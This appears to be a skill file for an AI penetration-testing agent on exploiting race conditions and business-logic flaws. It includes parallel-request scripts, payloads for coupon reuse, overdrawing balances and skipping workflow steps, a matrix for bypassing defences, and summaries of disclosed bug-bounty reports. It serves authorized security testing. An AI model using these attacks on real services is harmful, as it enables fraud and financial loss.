---
name: "Race Conditions & Business Logic"
description: "Exploit TOCTOU / limit-overrun races (single-packet / parallel concurrent requests) for double-spend, coupon/gift-card reuse, balance overdraw, and multi-step workflow state skips. Deterministic invariant-violation proof."
tags: ["race_condition", "business_logic", "idor"]
recommended_tools: ["curl", "python3 (httpx/asyncio)", "turbo-intruder (Burp)", "ffuf"]
vuln_classes: ["race_condition", "business_logic", "idor"]
domain: web
phase: exploitation
---
# Race Conditions & Business Logic

Maps to vuln_classes: race_condition, business_logic, idor (state/quantity manipulation).

## Where to look
Any check-then-act with a shared limited resource: coupon/gift-card/voucher redemption, balance withdrawal/transfer, stock/inventory decrement, vote/like once, invite/referral credit, rate-limited OTP/login, account creation uniqueness, file/object finalize, multi-step checkout (cart -> price -> pay -> confirm). White-box tell: a SELECT/read followed by an UPDATE/write on the same row WITHOUT a row lock, atomic decrement, or unique constraint.

## Payload ladder: detect -> confirm -> escalate

### 1. Limit-overrun race (the core technique)
Fire N identical requests CONCURRENTLY so multiple pass the check before any commits.
```
# bash parallel (crude)
for i in $(seq 1 30); do curl -s -X POST https://target/api/redeem \
  -H "Authorization: Bearer $TOK" -d '{"code":"SAVE50"}' & done; wait
```
For true simultaneity use HTTP/2 single-packet attack (one TCP packet carrying many requests) or last-byte-sync via Turbo Intruder. asyncio version:
```
import asyncio, httpx
async def go():
    async with httpx.AsyncClient(http2=True) as c:
        rs = await asyncio.gather(*[c.post(URL, headers=H, json=BODY) for _ in range(30)])
        print([r.status_code for r in rs])
asyncio.run(go())
```

### 2. Common targets
```
Coupon/gift-card:  redeem the same single-use code 20x in parallel -> applied multiple times.
Balance overdraw:  withdraw/transfer full balance from 2+ parallel requests -> net balance negative or double-paid.
Stock oversell:    buy last item from many sessions -> quantity goes below 0.
Limit bypass:      'one vote / one signup per email / one trial' enforced non-atomically.
MFA/OTP:           brute the OTP with parallelism that beats the attempt counter.
```

## Business-logic state-skip / parameter abuse
```
Workflow skip:   call the final step (POST /checkout/confirm) without the prerequisite (payment) -> order placed unpaid.
Forced state:    send X-Step: 3 or status=COMPLETED directly.
Negative/overflow values: quantity=-1 (credit instead of charge), price=0, amount=0.00001, huge int overflow.
Replay:          re-submit a completed transaction id / signed-but-not-nonce'd request.
```

## Deterministic proof signal
An INVARIANT is violated and persists on re-read:
- balance is negative, or total credited/debited exceeds the single allowed amount (sum the effects),
- a single-use code shows >1 successful redemption,
- inventory/quantity < 0,
- a workflow-final resource exists with the prerequisite step never completed.
Capture: the baseline single-request result (1 success) vs the concurrent burst result (N>1 successes), and the post-state read showing the violated invariant. Two or more HTTP 200 success responses to a provably single-use action = confirmed. Timing alone is never proof.

## Notes / discipline
- Minimum-impact: prove with the smallest overrun (2-3 successes) — do not drain real balances or place many real orders on authorized targets.
- Disable Nagle / use HTTP/2 multiplexing for tight windows; localhost/low-latency targets widen the window.

CWE-362 (TOCTOU race), CWE-841 (improper enforcement of behavioral workflow), CWE-840.

## Modern techniques & real-world CVEs (via recon-skills)

### Attack-surface signals (fast triage)
Endpoints most likely to race — grep the app's routes/JS for these:
```
/vote /upvote /like /favorite      /redeem /apply-coupon /use-code /claim
/purchase /checkout /confirm-order  /transfer /withdraw /send-money
/invite /referral /accept-invite    /upgrade /activate /trial
/delete /deactivate /cancel         /follow /subscribe
```
Response-header tells of a race-prone backend: `X-RateLimit-*` present (rate limiting exists but is often non-atomic), per-request `X-Request-Id`, and stateful ops served with **no `Cache-Control`**. Client-side JS "protection" that hints the server never hardened concurrency:
```javascript
button.disabled = true; $('#btn').prop('disabled', true)   // single-use button disable
setState({ used: true })                                    // optimistic UI before server confirms
await useVoucher(); await deductBalance();                  // sequential async, no lock
```
Tech-stack red flags: Rails ActiveRecord without `with_lock`/`lock!`; Node async/await read-then-write chains; PHP without `SELECT … FOR UPDATE`; Django `.get()/.filter()` without `select_for_update`; Redis counters without Lua/`INCR` atomicity; microservice A-validates / B-executes with no shared transaction; message queues lacking idempotency keys.

### White-box grep audit patterns
Run against source when it's available — the read-then-write-without-lock pattern is the root cause of every race:
```bash
# Rails / PHP: read without a lock
grep -rn "find_by\|where.*first" --include="*.rb"  | grep -v "lock"
grep -rn "SELECT.*WHERE"         --include="*.php" | grep -v "FOR UPDATE"
# JS: await get/find followed by await update/save (non-atomic)
grep -rn "await.*get\|await.*find" --include="*.js" -A2 | grep "await.*update\|await.*save"
# Django ORM without row lock
grep -rn "\.get(\|\.filter(" --include="*.py" | grep -v "select_for_update"
# Non-atomic counter increment (should be UPDATE SET x = x + 1 WHERE id = ?)
grep -rn "count += 1\|votes_count\|+= 1;.*save" --include="*.*"
```

### Defense-bypass matrix
| Defender control | Why the race still wins |
|---|---|
| Per-user rate limiting | Limit is checked before the action executes; simultaneous requests all pass the check before any is counted. |
| Idempotency keys / request tokens | Try sending parallel requests with no token, or race the uniqueness check itself (it has its own read-then-write window). |
| DB unique constraint | Constraint catches duplicates *after* the race — first two both succeed before enforcement; look for partial fulfillment where one 200s, one errors, but both effects persist. |
| Short-lived / expiring tokens | Pre-stage all requests with valid tokens, release via single-packet H2 so all land inside validity. |
| Queue-based serialization | Multiple workers on one queue can pick duplicate messages; overwhelm the queue during the window. |
| App-layer mutex / in-process lock | Distributed multi-server deploys don't share in-process locks — spray the same endpoint across CDN nodes / LB backends. |
| "Already used" code check | Check and update are separate; only atomic `UPDATE … WHERE used=false RETURNING id` truly prevents it. |

### Disclosed reports (root-cause specifics)
Modern, verified cases beyond the single-packet exemplars already cited above. Each names the exact non-atomic operation to look for:

- **Worldcoin / Tools for Humanity — World ID action-verification race** ([writeup](https://medium.com/@gonzo-hacks/the-fast-and-the-curious-finding-a-race-condition-in-worldcoin-621c89bfbd61)) — one-human-one-action bypass. ~20 parallel requests via Burp "Send in Parallel". Root cause: `canVerifyForAction` appended to an array with no DB-level lock; fix added a `nullifiers` table with atomic UPSERT. 2023, $3,000.
- **Stripe — promotion code redeemed past limit** ([H1 #1717650](https://hackerone.com/reports/1717650)) — promo with redemption limit = 1; open two payment-link tabs, apply the coupon in both, click Pay simultaneously → both charge. Root cause: `promotion_code.times_redeemed` incremented post-charge, no row-level lock. 2022, $250.
- **Stripe — Connect fee discount redeemed many times** ([H1 #1849626](https://hackerone.com/reports/1849626)) — parallel POSTs to the redemption endpoint before the credit-consumed flag flips. Root cause: non-atomic check-then-decrement on the credit balance object. 2023, $5,000 (~$600 platform-fee loss per redemption).
- **Reverb.com — gift-card multi-redemption** ([H1 #759247](https://hackerone.com/reports/759247)) — capture `POST /gift_cards/redeem`, duplicate N×, fire parallel → balance credited N× off one card. Root cause: consumption marker written *after* the balance credit, no `SELECT … FOR UPDATE` around the redemption read. 2019, $1,500 (foundational).
- **Cosmos / Starport faucet — double-mint** ([H1 #1438052](https://hackerone.com/reports/1438052)) — simultaneous `/faucet/transfer`; the Go `Transfer` fn does two state-mutating actions per request, neither serialized. Root cause: no per-recipient lock, read-modify-write not serialized. 2022, $5,000 (CVSS 9.3).
- **InnoGames — email-activation race → unlimited diamonds** ([H1 #509629](https://hackerone.com/reports/509629)) — race the activation endpoint with the same one-time token before `token_used` commits → first-activation bonus granted on every winning request. Root cause: token-consumption flag and reward grant in one transaction but isolation level too low (READ COMMITTED). 2019, $2,000.

### Root-cause cheat sheet
1. Check-then-act with no atomic op (`if voucher.used == false` then separate `update`).
2. Missing DB-level lock — ORM `find`/`filter` instead of `SELECT … FOR UPDATE`.
3. Optimistic concurrency with no version/`WHERE`-guard on the write.
4. Microservice TOCTOU — validate in service A, execute in service B, no shared transaction.
5. Counter increment outside a transaction (`x += 1; save()` vs `UPDATE SET x = x+1 WHERE id=?`).
6. Async fulfillment — eligibility checked sync, job runs async; a second request passes the check before the job completes.
7. Cached "has user voted?" returns stale `false` during the cache-miss window before the first write propagates.
